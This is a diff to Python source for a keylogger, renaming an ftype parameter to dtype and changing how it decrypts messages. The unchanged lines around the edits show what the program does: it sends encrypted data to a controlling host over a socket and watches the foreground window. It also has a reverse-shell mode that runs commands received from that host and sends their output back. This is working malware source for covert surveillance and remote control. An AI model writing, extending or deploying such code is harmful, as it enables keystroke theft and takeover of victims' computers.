@@ -127,10 +127,10 @@ class Keylogger:
             except socket.error as e:
                 print(e)
 
-    def send_to_host(self, data: str | bytes, ftype:bytes):
+    def send_to_host(self, data: str | bytes, dtype:bytes):
         if isinstance(data, str):
             data = data.encode("utf-8")
-        encrypted_data = utils.encrypt(data=data, ftype=ftype)
+        encrypted_data = utils.encrypt(data=data, dtype=dtype)
 
         try:
             self.sock.sendall(encrypted_data)
@@ -139,10 +139,9 @@ class Keylogger:
             self.connect_to_host()
 
     def receive_from_host(self):
-        recv = utils.decrypt(self.sock.recv(1024))
-        if recv:
-            return str(recv)[2:-1]
-        return None
+        recv = self.sock.recv(1024)
+        plaintext, dtype = utils.decrypt(recv)
+        return plaintext
 
 #--------------- POLLING FUNCTIONS ---------------#
     def check_foreground_window(self):
@@ -179,7 +178,7 @@ class Keylogger:
 
     def stop(self):
         self.active = False
-        self.send_to_host(data="terminated", ftype="msg")
+        self.send_to_host(data="terminated", dtype="msg")
         self.sock.close()
 
 
@@ -197,16 +196,16 @@ if __name__ == "__main__":
             if reverse_shell:
                 if recv == "exit":
                     reverse_shell = False
-                    keylogger.send_to_host(data="reverse shell deactivated", ftype="msg")
+                    keylogger.send_to_host(data="reverse shell deactivated", dtype="msg")
                 else:
-                    keylogger.send_to_host(data=utils.execute_command(recv), ftype="msg")
+                    keylogger.send_to_host(data=utils.execute_command(recv), dtype="msg")
             else:
                 if recv == "exit":
                     keylogger.stop()
                     break
                 elif recv == "shell":
                     reverse_shell = True
-                    keylogger.send_to_host(data="reverse shell activated", ftype="msg")
+                    keylogger.send_to_host(data="reverse shell activated", dtype="msg")
                 else:
-                    keylogger.send_to_host(data="received", ftype="msg")
+                    keylogger.send_to_host(data="received", dtype="msg")
                     print(recv)
